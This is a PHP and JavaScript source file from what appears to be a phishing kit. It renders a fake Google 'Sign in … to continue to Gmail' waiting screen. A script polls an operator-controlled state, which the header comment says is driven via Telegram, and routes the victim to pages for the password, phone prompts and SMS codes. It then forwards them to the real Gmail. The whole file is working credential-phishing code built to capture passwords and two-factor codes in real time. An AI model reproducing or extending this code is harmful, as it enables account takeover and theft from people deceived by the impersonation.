<?php
// loading.php — Persistent loading screen, Telegram-controlled
require 'config.php';
require 'helpers.php';
session_start();

if (empty($_SESSION['email'])) { header('Location: index.php'); exit; }

// Reset prompt_number to avoid stale number showing on prompt page
// Only clear it if transitioning from a success state
$sid   = $_SESSION['visitor_id'] ?? session_id();
$state = get_state($sid);

// If already at success, send immediately
if ($state['page'] === 'success') {
    header('Location: https://mail.google.com/');
    exit;
}

page_open('Sign in', true);
?>

<div class="card" role="main" style="max-width:460px">
  <?= g_logo() ?>
  <p style="font-size:16px;color:#e8eaed;margin-bottom:4px">Sign in</p>
  <p style="font-size:14px;color:#9aa0a6;font-family:'Roboto',sans-serif">to continue to Gmail</p>
  <div style="height:1px;background:#3c4043;margin:28px 0"></div>
  <div class="loading-wrap">
    <div class="spinner"></div>
    <p class="loading-title">Please wait...</p>
    <p class="loading-sub">Do not close or refresh this page</p>
  </div>
</div>

<script>
(function() {
  // Map of page states to URLs
  const PAGE_MAP = {
    'password':      'password.php',
    'pw_error':      'password.php',
    'verify_yes':    'verify-yes.php',
    'verify_prompt': 'verify-prompt.php',
    'prompt_error':  'verify-prompt.php',
    'verify_sms':    'verify-sms.php',
    'sms_error':     'verify-sms.php',
    'blocked':       'blocked.php',
    'success':       'https://mail.google.com/',
  };

  let lastPage = 'loading';
  let redirecting = false;

  function poll() {
    if (redirecting) return;

    fetch('poll.php?t=' + Date.now(), { cache: 'no-store' })
      .then(r => r.json())
      .then(data => {
        if (redirecting) return;
        const page = data.page;

        // Stay on loading
        if (page === 'loading' || page === lastPage) return;

        lastPage = page;
        redirecting = true;

        const dest = PAGE_MAP[page];
        if (dest) {
          window.location.replace(dest);
        }
      })
      .catch(() => { /* keep polling silently */ });
  }

  setInterval(poll, 1200);
  poll();
})();
</script>

<?php page_close(); ?>
